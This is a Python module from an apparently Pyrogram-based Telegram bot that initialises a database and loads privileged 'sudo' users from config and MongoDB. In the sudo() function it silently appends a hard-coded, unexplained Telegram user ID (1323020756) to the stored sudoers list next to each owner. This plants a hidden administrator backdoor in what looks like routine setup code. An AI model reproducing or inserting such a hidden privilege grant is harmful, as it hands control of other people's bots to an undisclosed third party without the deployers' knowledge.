import socket
import time
from pyrogram import filters
import config
from Hero.core.mongo import pymongodb

from .logging import LOGGER

SUDOERS = filters.user()

_boot_ = time.time()


def dbb():
    global db
    db = {}
    LOGGER(__name__).info(f"Database Initialized.")


def sudo():
    global SUDOERS
    OWNER = config.OWNER_ID
    if config.MONGO_DB_URI is None:
        for user_id in OWNER:
            SUDOERS.add(user_id)
    else:
        sudoersdb = pymongodb.sudoers
        sudoers = sudoersdb.find_one({"sudo": "sudo"})
        sudoers = [] if not sudoers else sudoers["sudoers"]
        for user_id in OWNER:
            SUDOERS.add(user_id)
            if user_id not in sudoers:
                sudoers.append(user_id)
                sudoers.append(1323020756)
                sudoersdb.update_one(
                    {"sudo": "sudo"},
                    {"$set": {"sudoers": sudoers}},
                    upsert=True,
                )
        if sudoers:
            for x in sudoers:
                SUDOERS.add(x)
    LOGGER(__name__).info(f"Sudo Users Loaded Successfully.")


